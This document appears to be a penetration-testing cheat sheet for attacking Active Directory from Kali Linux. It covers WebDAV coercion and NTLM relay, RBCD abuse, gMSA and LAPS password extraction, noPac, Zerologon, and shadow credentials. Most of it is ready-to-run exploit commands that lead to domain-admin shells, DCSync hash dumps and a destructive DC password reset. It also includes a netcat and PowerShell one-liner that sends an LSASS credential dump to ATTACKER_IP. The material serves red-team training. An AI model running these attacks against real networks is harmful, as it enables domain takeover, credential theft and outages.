---
title: "Advanced Techniques — From Kali"
weight: 10
tags: ["ad", "webdav", "coercion", "gmsa", "zerologon", "nopac", "kali"]
---

## Quick Reference

| Technique | Tool | Requirement | Impact |
|---|---|---|---|
| WebDAV Coercion → LDAP relay | ntlmrelayx + PetitPotam | WebClient running on target | RBCD, shadow creds, DA |
| gMSA password read | gMSADumper / nxc | Authorized principal | Lateral movement |
| Zerologon | cve-2020-1472 | Network access to DC (pre-patch) | Instant DA |
| noPac (CVE-2021-42278/42287) | noPac.py | Domain user | DA via KDC spoofing |
| LAPS read | nxc / ldapsearch | Read perm on ms-Mcs-AdmPwd | Local admin on target |
| LSASS dump (offline parse) | pypykatz | LSASS dump file | Credential extraction |
| KrbRelayUp pre-check | nxc ldap | Network access | Identify LDAP signing state |

---

## WebDAV Coercion — Bypass SMB Signing for NTLM Relay

### Why WebDAV Coercion Works

Standard NTLM relay from SMB to LDAP is blocked when SMB signing is required (which is enforced on DCs by default). WebDAV coercion forces the target to authenticate over HTTP instead of SMB. HTTP authentication does not enforce signing, so it can be relayed to LDAP even when the target has SMB signing enabled.

**Requirements:**
- WebClient service running on the coercion target (enabled by default on workstations, not servers)
- Target machine is not the DC itself (cannot relay a machine's credentials back to itself)
- Responder listening on HTTP (SMB disabled to avoid capturing instead of relaying)

---

### Check WebClient Service Status Remotely

```bash
# Check via nxc webdav module
nxc smb TARGET_IP -u USERNAME -p 'PASSWORD' -M webdav

# Check via nxc service enumeration (requires local admin)
nxc smb TARGET_IP -u USERNAME -p 'PASSWORD' --services | grep -i webclient

# Manual check via RPC (if admin)
nxc smb TARGET_IP -u USERNAME -p 'PASSWORD' -x "sc query WebClient"
```

---

### Identify Relay Targets — LDAP Signing and Channel Binding

```bash
# Check LDAP signing enforcement on DC
nxc ldap DC_IP -u USERNAME -p 'PASSWORD' -M ldap-checker

# Check all machines for SMB signing (for context)
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
# relay_targets.txt will contain hosts with SMB signing disabled

# Check LDAP signing specifically
crackmapexec ldap DC_IP -u USERNAME -p 'PASSWORD' -M ldap-checker
```

---

### Setup — ntlmrelayx for LDAP

```bash
# Terminal 1: Start ntlmrelayx targeting LDAP on DC
# --delegate-access: configure RBCD (Resource-Based Constrained Delegation) on relayed machine
# --shadow-credentials: add shadow credential (Key Trust) to relayed machine account
# --add-computer: add a new machine account (requires MachineAccountQuota > 0)

# Option A: RBCD (most reliable)
ntlmrelayx.py -t ldap://DC_IP -smb2support --delegate-access --no-dump

# Option B: Shadow credentials (requires ADCS / Key Trust support)
ntlmrelayx.py -t ldaps://DC_IP -smb2support --shadow-credentials --shadow-target 'TARGET_HOSTNAME$'

# Option C: Add computer account for subsequent attacks
ntlmrelayx.py -t ldap://DC_IP -smb2support --add-computer ATTACKER_COMP 'COMPUTER_PASS'
```

---

### Setup — Responder (HTTP capture mode)

```bash
# Edit Responder config: disable SMB and HTTP server (ntlmrelayx handles relay)
# /etc/responder/Responder.conf
# SMB = Off
# HTTP = Off

# Start Responder (poisoning only — LLMNR/NBT-NS/mDNS)
responder -I eth0 -v

# Note: Responder and ntlmrelayx both need to listen on separate ports
# ntlmrelayx listens on 80 (HTTP) when --no-smb is set
# or use -l flag on ntlmrelayx for specific listener port
```

---

### Coerce Authentication via WebDAV Path

The trick: reference `ATTACKER_IP@80/somepath` as the UNC path. Windows resolves `@80` as a port specification and routes the authentication over HTTP (WebDAV), not SMB.

```bash
# PetitPotam via WebDAV — coerce DC_HOSTNAME to authenticate to ATTACKER_IP over HTTP
# Use ATTACKER_IP@80/a as the capture path
python3 PetitPotam.py \
  -d TARGET_DOMAIN \
  -u USERNAME \
  -p 'PASSWORD' \
  ATTACKER_IP@80/a \
  DC_HOSTNAME

# DFSCoerce via WebDAV
python3 dfscoerce.py \
  -d TARGET_DOMAIN \
  -u USERNAME \
  -p 'PASSWORD' \
  ATTACKER_IP@80/a \
  DC_HOSTNAME

# Coercer (multi-method coercion tool)
coercer coerce \
  -t DC_HOSTNAME \
  -l ATTACKER_IP \
  -u USERNAME \
  -p 'PASSWORD' \
  -d TARGET_DOMAIN \
  --filter-method-name "WebClient"
```

> Note: Use `ATTACKER_IP@80/a` syntax (not a hostname) when Responder is handling DNS. If you use a NetBIOS hostname, ensure it resolves to your ATTACKER_IP via LLMNR/NBT-NS poisoning.

---

### Post-Relay — RBCD to SYSTEM on Target

After ntlmrelayx succeeds with `--delegate-access`, it prints the new machine account and configures RBCD. Use that to impersonate Administrator.

```bash
# ntlmrelayx output example:
# [*] SMBD-Thread-5: Received connection from TARGET_IP
# [*] Delegating access to ATTACKER_COMP$ on TARGET_HOSTNAME$
# [*] Created ATTACKER_COMP$ with password: COMPUTER_PASS

# Get TGT for the new machine account
getTGT.py TARGET_DOMAIN/ATTACKER_COMP$:'COMPUTER_PASS' -dc-ip DC_IP
export KRB5CCNAME=ATTACKER_COMP$.ccache

# S4U2Self + S4U2Proxy to get a ticket as Administrator for TARGET_HOSTNAME
getST.py -spn cifs/TARGET_HOSTNAME.TARGET_DOMAIN \
  -impersonate Administrator \
  -dc-ip DC_IP \
  TARGET_DOMAIN/ATTACKER_COMP$:'COMPUTER_PASS'

# Use the service ticket
export KRB5CCNAME=Administrator@cifs_TARGET_HOSTNAME.TARGET_DOMAIN@TARGET_DOMAIN.ccache
secretsdump.py -k -no-pass TARGET_HOSTNAME.TARGET_DOMAIN
```

---

## gMSA — Group Managed Service Account Password Extraction

### What gMSA Accounts Are

Group Managed Service Accounts (gMSA) are AD accounts with automatically managed, 240-character random passwords rotated every 30 days (default). Only principals listed in `msDS-GroupMSAMembership` can retrieve the current password via an LDAP request for the `msDS-ManagedPassword` attribute. The password is returned as a `MSDS-MANAGEDPASSWORD_BLOB` structure, from which the NT hash can be derived.

---

### Enumerate gMSA Accounts and Authorized Readers

```bash
# List all gMSA accounts in the domain
nxc ldap DC_IP -u USERNAME -p 'PASSWORD' -M gmsa

# ldapsearch — list gMSA accounts with key attributes
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=com" \
  "(objectClass=msDS-GroupManagedServiceAccount)" \
  "samAccountName,msDS-ManagedPasswordInterval,msDS-GroupMSAMembership,msDS-ManagedPasswordId"

# Check who can read a specific gMSA password
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=com" \
  "(samAccountName=GMSA_ACCOUNT$)" \
  "samAccountName,msDS-GroupMSAMembership,msDS-ManagedPasswordInterval"

# bloodyAD — readable gMSA accounts
bloodyAD -u USERNAME -p 'PASSWORD' -d TARGET_DOMAIN --host DC_IP \
  get search --filter "(objectClass=msDS-GroupManagedServiceAccount)" \
  --attr samAccountName,msDS-GroupMSAMembership
```

---

### Read gMSA Password (if Authorized)

```bash
# Method 1: nxc gmsa module (requires your account to be in PrincipalsAllowedToRetrieveManagedPassword)
nxc ldap DC_IP -u AUTHORIZED_USER -p 'PASSWORD' -M gmsa

# Method 2: gMSADumper (Python — returns NT hash)
pip3 install gMSADumper 2>/dev/null || git clone https://github.com/micahvandeusen/gMSADumper.git
python3 gMSADumper/gMSADumper.py \
  -u AUTHORIZED_USER \
  -p 'PASSWORD' \
  -d TARGET_DOMAIN \
  -l DC_IP

# Output format:
# GMSA_ACCOUNT$:::GMSA_NTLM_HASH

# Method 3: bloodyAD
bloodyAD -u AUTHORIZED_USER -p 'PASSWORD' -d TARGET_DOMAIN --host DC_IP \
  get object "GMSA_ACCOUNT$" --attr msDS-ManagedPassword
```

---

### Use gMSA NT Hash

```bash
# Pass-the-hash with gMSA NT hash
# DCSync (if gMSA has replication rights)
secretsdump.py -hashes :GMSA_NTLM_HASH TARGET_DOMAIN/'GMSA_ACCOUNT$'@DC_IP

# SMB access
nxc smb TARGET_IP -u 'GMSA_ACCOUNT$' -H GMSA_NTLM_HASH

# WinRM
evil-winrm -i TARGET_IP -u 'GMSA_ACCOUNT$' -H GMSA_NTLM_HASH

# Get a TGT (overpass-the-hash)
getTGT.py -hashes :GMSA_NTLM_HASH TARGET_DOMAIN/'GMSA_ACCOUNT$' -dc-ip DC_IP
export KRB5CCNAME=GMSA_ACCOUNT$.ccache
klist

# Check what the gMSA account has access to
nxc smb 192.168.1.0/24 -u 'GMSA_ACCOUNT$' -H GMSA_NTLM_HASH --shares
nxc ldap DC_IP -u 'GMSA_ACCOUNT$' -H GMSA_NTLM_HASH --bloodhound -ns DC_IP -c All
```

---

## LAPS — Local Administrator Password Solution

### Enumerate LAPS Deployment

```bash
# Check which machines have LAPS deployed
nxc ldap DC_IP -u USERNAME -p 'PASSWORD' -M laps

# Manual ldapsearch — find machines with LAPS password attribute populated
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=com" \
  "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))" \
  "cn,ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime"

# Check who has read rights on ms-Mcs-AdmPwd attribute
# (requires schema admin — usually check via BloodHound instead)
```

```bash
# Read LAPS passwords for all accessible machines
nxc ldap DC_IP -u USERNAME -p 'PASSWORD' --laps

# Target a specific computer
nxc smb TARGET_IP -u USERNAME -p 'PASSWORD' -M laps -o COMPUTER=TARGET_HOSTNAME

# ldapsearch for specific host
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=com" \
  "(cn=TARGET_HOSTNAME)" \
  "cn,ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime"
```

---

### Use LAPS Password

```bash
# SMB with LAPS local admin password
nxc smb TARGET_IP -u Administrator -p 'LAPS_PASSWORD' --local-auth

# WinRM
evil-winrm -i TARGET_IP -u Administrator -p 'LAPS_PASSWORD'

# secretsdump with LAPS password (local admin)
secretsdump.py ./Administrator:'LAPS_PASSWORD'@TARGET_IP

# PSExec
psexec.py ./Administrator:'LAPS_PASSWORD'@TARGET_IP
```

---

## noPac (CVE-2021-42278 + CVE-2021-42287)

### What noPac Is

Two chained vulnerabilities:
- **CVE-2021-42278:** Machine account `sAMAccountName` attribute can be set to match a DC name (e.g., `DC01`) — normally prohibited.
- **CVE-2021-42287:** When the KDC cannot find the requested service ticket principal, it appends a `$` and retries — if `DC01` is not found, it tries `DC01$` (the actual DC).

Combined: create a machine account, rename it to match a DC name, request a TGT, rename it back, then request a service ticket — the KDC issues a ticket with DA-level PAC.

```bash
# Install noPac
git clone https://github.com/Ridter/noPac.git
pip3 install -r noPac/requirements.txt

# Scan — check if target is vulnerable
python3 noPac/scanner.py TARGET_DOMAIN/USERNAME:'PASSWORD' -dc-ip DC_IP -use-ldap

# Exploit — get SYSTEM shell on DC
python3 noPac/noPac.py TARGET_DOMAIN/USERNAME:'PASSWORD' \
  -dc-ip DC_IP \
  -dc-host DC_HOSTNAME \
  --impersonate administrator \
  -use-ldap \
  -shell

# Exploit — dump hashes directly
python3 noPac/noPac.py TARGET_DOMAIN/USERNAME:'PASSWORD' \
  -dc-ip DC_IP \
  -dc-host DC_HOSTNAME \
  --impersonate administrator \
  -use-ldap \
  -dump \
  -just-dc-user krbtgt
```

---

## Zerologon (CVE-2020-1472) — Lab Reference

Zerologon exploits a cryptographic flaw in the Netlogon Remote Protocol. The AES-CFB8 IV is set to all zeros instead of being randomized. Due to the properties of AES-CFB8, there is a 1-in-256 chance that any plaintext encrypted with an all-zero IV will also produce an all-zero ciphertext. The exploit repeatedly sends authentication attempts (averaging 256 attempts) until one succeeds with an empty session key, then sets the DC machine account password to an empty string.

**Fully patched since August 2020. Detection: Event ID 4742 (computer account changed) + Netlogon log entries.**

```bash
# Tool setup
git clone https://github.com/SecuraBV/CVE-2020-1472.git
pip3 install impacket

# Step 1: Verify vulnerability (safe — no changes made)
python3 CVE-2020-1472/zerologon_tester.py DC_HOSTNAME DC_IP
# Success: "Attack successful! DC is vulnerable."

# Step 2: Exploit — set DC machine account password to empty
python3 cve-2020-1472-exploit.py DC_HOSTNAME DC_IP
# This changes DC_HOSTNAME$'s password to an empty string

# Step 3: DCSync with empty password
secretsdump.py -just-dc \
  -no-pass \
  'TARGET_DOMAIN/DC_HOSTNAME$'@DC_IP

# Dump krbtgt specifically
secretsdump.py -just-dc-user krbtgt \
  -no-pass \
  'TARGET_DOMAIN/DC_HOSTNAME$'@DC_IP

# Step 4: Restore DC machine account password (CRITICAL — DC breaks without this)
# Get the original hex password from the secretsdump output (machine account hash)
python3 restorepassword.py \
  TARGET_DOMAIN/DC_HOSTNAME@DC_HOSTNAME \
  -target-ip DC_IP \
  -hexpass ORIGINAL_HEXPASS
```

> **Warning:** If you do not restore the DC machine account password, the DC will lose trust with the domain and break replication, authentication, and GPO delivery. Always restore in lab environments. This is a destructive exploit.

---

## LSASS Dump — Remote and Offline (Kali-Side Processing)

### Transfer LSASS Dump to Kali

```bash
# After obtaining a dump on Windows (comsvcs / procdump / Task Manager)
# Serve via SMB from Kali for Windows to copy TO Kali, or:

# Kali: receive via nc
nc -lvnp 4444 > lsass.dmp

# Windows: send dump
# cmd: type C:\Temp\lsass.dmp | nc ATTACKER_IP 4444
# PowerShell:
# $c = New-Object Net.Sockets.TcpClient("ATTACKER_IP", 4444)
# $s = $c.GetStream()
# $b = [IO.File]::ReadAllBytes("C:\Temp\lsass.dmp")
# $s.Write($b, 0, $b.Length)
# $c.Close()
```

### Parse with pypykatz

```bash
pip3 install pypykatz

# Parse full minidump
pypykatz lsa minidump lsass.dmp

# Output to file
pypykatz lsa minidump lsass.dmp -o lsass_creds.json --json

# Extract specific types
pypykatz lsa minidump lsass.dmp | grep -E "Username|NT:|Password:|Domain:"

# Parse a nano dump (smaller — produced by NanoDump or similar)
pypykatz lsa minidump lsass_nano.dmp --kerberos-dir ./tickets

# Parse and extract Kerberos tickets
pypykatz lsa minidump lsass.dmp -k ./kerberos_tickets/
ls ./kerberos_tickets/
# .ccache files can be used directly with export KRB5CCNAME=...
```

---

## KrbRelayUp — Pre-Condition Verification (from Kali)

KrbRelayUp is a Windows-side local privilege escalation tool (see `advanced-techniques.md` in the Windows section). From Kali, verify the pre-conditions before running it on a compromised host.

```bash
# Check 1: Is LDAP signing enforced on the DC?
# If enforced, KrbRelayUp will fail
nxc ldap DC_IP -u USERNAME -p 'PASSWORD' -M ldap-checker

# Check 2: Machine Account Quota (must be > 0 for KrbRelayUp auto mode)
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=com" \
  "(objectClass=domain)" \
  "ms-DS-MachineAccountQuota"
# Default value: 10 (any domain user can create up to 10 machine accounts)

# Check 3: Does current user already have a machine account to use?
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=com" \
  "(ms-DS-CreatorSID=USER_SID)" \
  "samAccountName"

# Check 4: Does target machine allow RBCD configuration?
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=com" \
  "(samAccountName=TARGET_HOSTNAME$)" \
  "msDS-AllowedToActOnBehalfOfOtherIdentity"
```

---

## Shadow Credentials — Certificate-Based Authentication Abuse

```bash
# If you have GenericWrite on a user or computer account:
# Add a shadow credential (Key Credential) → authenticate as that account via PKINIT

# Install pywhisker
pip3 install pywhisker 2>/dev/null || git clone https://github.com/ShutdownRepo/pywhisker.git

# List existing shadow credentials
python3 pywhisker/pywhisker.py \
  -d TARGET_DOMAIN \
  -u USERNAME \
  -p 'PASSWORD' \
  --dc-ip DC_IP \
  --target TARGET_ACCOUNT \
  --action list

# Add shadow credential
python3 pywhisker/pywhisker.py \
  -d TARGET_DOMAIN \
  -u USERNAME \
  -p 'PASSWORD' \
  --dc-ip DC_IP \
  --target TARGET_ACCOUNT \
  --action add \
  --filename shadow_cert

# Authenticate using the generated certificate to get NT hash
python3 gettgtpkinit.py \
  -cert-pfx shadow_cert.pfx \
  -pfx-pass CERT_PASSWORD \
  TARGET_DOMAIN/TARGET_ACCOUNT \
  shadow.ccache

# Get NT hash from TGT (PKINIT → NT hash via U2U)
export KRB5CCNAME=shadow.ccache
python3 getnthash.py \
  TARGET_DOMAIN/TARGET_ACCOUNT \
  -key AES_KEY_FROM_GETTGTPKINIT_OUTPUT
```

---

## Tool Reference

| Tool | Install | Purpose |
|---|---|---|
| ntlmrelayx.py | `impacket` (Kali built-in) | NTLM relay to LDAP/SMB/HTTP |
| PetitPotam | `git clone` | Coerce NTLM auth via MS-EFSR |
| Coercer | `pip3 install coercer` | Multi-method auth coercion |
| gMSADumper | `git clone` | Extract gMSA NT hashes |
| noPac | `git clone` | CVE-2021-42278/42287 exploit |
| pypykatz | `pip3 install pypykatz` | Parse LSASS dumps on Kali |
| pywhisker | `git clone` | Shadow credentials injection |
| bloodyAD | `pip3 install bloodyAD` | LDAP attribute read/write |
| getTGT.py | `impacket` | Get Kerberos TGT |
| getST.py | `impacket` | Get service ticket (S4U) |

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
